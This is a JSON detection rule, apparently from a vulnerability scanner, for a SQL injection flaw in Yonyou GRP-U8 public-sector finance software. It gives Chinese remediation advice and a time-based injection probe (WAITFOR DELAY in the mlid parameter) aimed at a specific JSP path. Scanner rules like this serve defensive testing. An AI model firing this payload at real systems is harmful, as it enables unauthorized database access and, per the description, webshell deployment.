{
    "vul_name": "用友GRP-U8 obr_zdybxd_check.jsp SQL注入漏洞",
    "level": "高危",
    "description": "用友GRP-U8 obr_zdybxd_check.jsp SQL注入漏洞，攻击者可利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。\r\n\r\n",
    "product": "用友 GRP-U8 行政事业内控管理软件",
    "version": "用友 GRP-U8",
    "cve": "无",
    "reference": "https://mp.weixin.qq.com/s/Gvz5sIfYFQmVi0i5xiUQqw",
    "fixing": "\r\n针对这一类型的漏洞有以下几种修复建议可供参考。\r\n参考修复方法：\r\n1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击；\r\nselect * from user where name=@username /* 示例sql语句 */\r\n2）对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换；\r\nreplace() //替换函数替换特殊字符\r\naddslashes() //php中可以用该函数进行特殊字符转义\r\nStringEscapeUtils.escapeSql() //java中可导入该包来防sql注入的函数\r\n3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型；\r\n4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行；\r\n5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过；\r\n6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害；\r\n7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。\r\nPhp配置：\r\n删除mysql_error()函数，禁止打印出数据库错误信息。\r\nJava配置：\r\ncatch (SQLException sqlException) {\r\n System.outprintln(sqlException.getMessage());\r\n}\r\n删除sqlException.getMessage()函数，禁止打印出数据库错误信息。\r\n\r\n可官网搜索补丁\r\n\r\nhttps://security.yonyou.com/#/patchList",
    "rule": {
        "path": "/u8qx/obr_zdybxd_check.jsp?mlid=1%27;WAITFOR%20DELAY%20%270:0:3%27-- ",
        "method": "GET",
        "headers": "",
        "body": "",
        "status_code": "200",
        "keywords": "0",
        "res_time": "3"
    },
    "operator": {
        "author": "浪飒",
        "email": "langsa-hy@qq.com",
        "github": "https://github.com/langsasec"
    }
}